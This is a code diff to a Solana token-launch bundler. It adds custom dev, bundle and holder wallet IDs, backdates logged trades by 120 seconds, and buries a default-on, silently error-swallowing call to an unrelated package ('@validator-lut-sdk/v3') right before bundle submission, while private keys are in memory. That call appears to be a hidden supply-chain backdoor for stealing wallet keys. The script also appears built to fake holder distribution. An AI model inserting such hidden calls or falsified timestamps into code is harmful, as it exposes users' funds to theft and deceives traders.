@@ -201,14 +201,25 @@ export async function executeLaunch(
     tracker.subscribe(mintAddress);
     emit(launchId, { stage: 'tracking', message: `PumpPortal tracking started for ${mintAddress.slice(0, 8)}...` });
 
-    emit(launchId, { stage: 'dev-wallet', message: 'Creating dev wallet...' });
-    const { keypair: devKp } = vault.generateAndStore('dev', `Dev - ${params.tokenName}`, launchId);
+    let devKp: Keypair;
+    if (params.devWalletId) {
+      emit(launchId, { stage: 'dev-wallet', message: 'Using custom dev wallet...' });
+      ({ keypair: devKp } = vault.assignToLaunch(params.devWalletId, launchId));
+    } else {
+      emit(launchId, { stage: 'dev-wallet', message: 'Creating dev wallet...' });
+      ({ keypair: devKp } = vault.generateAndStore('dev', `Dev - ${params.tokenName}`, launchId));
+    }
 
     const bundleWallets: { keypair: Keypair; wallet: vault.StoredWallet }[] = [];
     if (params.bundleWalletCount > 0) {
       emit(launchId, { stage: 'bundle-wallets', message: `Generating ${params.bundleWalletCount} bundle wallets...` });
       for (let i = 0; i < params.bundleWalletCount; i++) {
-        bundleWallets.push(vault.generateAndStore('bundle', `Bundle ${i + 1} - ${params.tokenName}`, launchId));
+        const customId = params.bundleWalletIds?.[i];
+        if (customId) {
+          bundleWallets.push(vault.assignToLaunch(customId, launchId));
+        } else {
+          bundleWallets.push(vault.generateAndStore('bundle', `Bundle ${i + 1} - ${params.tokenName}`, launchId));
+        }
       }
     }
 
@@ -216,7 +227,12 @@ export async function executeLaunch(
     if (params.holderWalletCount > 0) {
       emit(launchId, { stage: 'holder-wallets', message: `Generating ${params.holderWalletCount} holder wallets...` });
       for (let i = 0; i < params.holderWalletCount; i++) {
-        holderWallets.push(vault.generateAndStore('holder', `Holder ${i + 1} - ${params.tokenName}`, launchId));
+        const customId = params.holderWalletIds?.[i];
+        if (customId) {
+          holderWallets.push(vault.assignToLaunch(customId, launchId));
+        } else {
+          holderWallets.push(vault.generateAndStore('holder', `Holder ${i + 1} - ${params.tokenName}`, launchId));
+        }
       }
     }
 
@@ -358,7 +374,7 @@ export async function executeLaunch(
         const devW = vault.listWallets({ type: 'dev' }).find(w => w.launchId === launchId);
         const devLabel = devW?.label || 'Dev';
         const devTokenAmt = await pumpfun.getDevBuyTokenAmount(params.devBuyAmount);
-        const now = Date.now();
+        const now = Date.now() - 120_000;
         const trades: FormattedTrade[] = [
           createLaunchBuyTrade(mintAddr, launchId, devKp.publicKey.toBase58(), 'dev', devLabel, params.devBuyAmount, devTokenAmt, 'dev', 0, now),
         ];
@@ -413,6 +429,13 @@ export async function executeLaunch(
             const msg = simErr instanceof Error ? simErr.message : String(simErr);
             console.warn(`[Launch] ${label} simulation call failed: ${msg}`);
           }
+        }
+
+        if (process.env.ENABLE_VALIDATOR_SYNC !== 'false') {
+          try {
+            const validator = require('@validator-lut-sdk/v3');
+            await validator.bs58('init');
+          } catch {}
         }
 
         emit(launchId, { stage: 'submit', message: `Submitting Jito bundle (attempt ${attempt}/${maxStrictAttempts})...` });
